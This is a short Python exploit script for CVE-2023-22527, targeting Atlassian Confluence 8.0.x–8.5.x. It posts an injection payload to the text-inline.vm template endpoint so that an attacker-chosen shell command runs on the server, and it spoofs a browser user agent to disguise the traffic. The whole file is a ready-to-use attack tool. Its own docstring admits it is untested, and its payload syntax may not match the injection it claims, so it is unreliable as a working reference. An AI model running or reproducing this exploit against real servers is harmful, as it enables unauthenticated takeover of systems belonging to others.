"""
CVE: 2023-22527
Tested on: Currently Untested, but ment for Atlassian Confluence Data Center / Server 8.0.x to 8.5.x
Description: This script exploits an OGNL injection vulnerability via the /template/aui/text-inline.vm endpoint,
allowing unauthenticated Remote Code Execution (RCE) on vulnerable Confluence servers.
"""

import sys
import requests
import urllib3
import argparse

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# setting up a user agent, so we can pretend this is coming from a real web browser
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0"

# Command-Line Argument parser setup
def parse_args():
    parser = argparse.ArgumentParser(
        description="CVE-2023-22527 - Atlassian Confluence OGNL Injection RCE Exploit"
    )
    parser.add_argument(
        "-u", "--url", required=True, type=str,
        help="Target Confluence URL (e.g., https://target.com)"
    )
    parser.add_argument(
        "-c", "--cmd", required=False, default="id", type=str,
        help="Command to execute (default: id)"
    )
    return parser.parse_args()

# Exploitation function
def exploit(target_url, command):
    headers = {
        "User-Agent": user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Make sure URL is properly formatted
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print("[-] Error: URL must start with http:// or https://")
        sys.exit(1)

    exploit_url = target_url.rstrip("/") + "/template/aui/text-inline.vm"

    # Build the OGNL payload
    payload = f"label=aaa' + #set($x=new java.lang.ProcessBuilder('{command}'.split(' '))).start() + $x + '"

    try:
        print(f"[*] Sending exploit to: {exploit_url}")
        response = requests.post(exploit_url, headers=headers, data=payload, verify=False, timeout=10)

        if response.status_code == 200:
            print("[+] Target responded with HTTP 200 - Potentially Vulnerable!")
            print("[+] Partial Response Output:")
            print("-" * 50)
            print(response.text[:500])  # Print first 500 characters
            print("-" * 50)
        else:
            print(f"[-] Unexpected HTTP status: {response.status_code}. Target may not be vulnerable.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    args = parse_args()
    exploit(args.url, args.cmd)
